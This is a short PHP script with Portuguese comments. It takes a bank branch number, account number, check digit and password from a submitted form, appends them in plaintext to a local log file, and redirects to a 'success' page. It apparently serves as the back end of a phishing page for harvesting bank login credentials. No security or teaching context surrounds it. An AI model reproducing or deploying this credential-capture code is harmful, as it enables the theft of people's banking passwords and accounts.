<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Verifica se os dados foram enviados corretamente
    if (isset($_POST['agencia'], $_POST['conta'], $_POST['digitoConta'], $_POST['senha'])) {
        $agencia = $_POST['agencia'];
        $conta = $_POST['conta'];
        $digitoConta = $_POST['digitoConta'];
        $senha = $_POST['senha'];
        $data_hora = date('Y-m-d H:i:s');

        // Monta a linha de log
        $linhaLog = "$data_hora - Agência: $agencia, Conta: $conta, Dígito: $digitoConta, Senha: $senha\n";

        // Caminho do arquivo onde os logs serão salvos
        $caminhoArquivo = 'registro_log.txt';

        // Salva no arquivo
        file_put_contents($caminhoArquivo, $linhaLog, FILE_APPEND | LOCK_EX);

        // Redireciona após o envio (opcional)
        header('Location: sucesso.html'); // Crie uma página de sucesso
        exit();
    }
}
?>
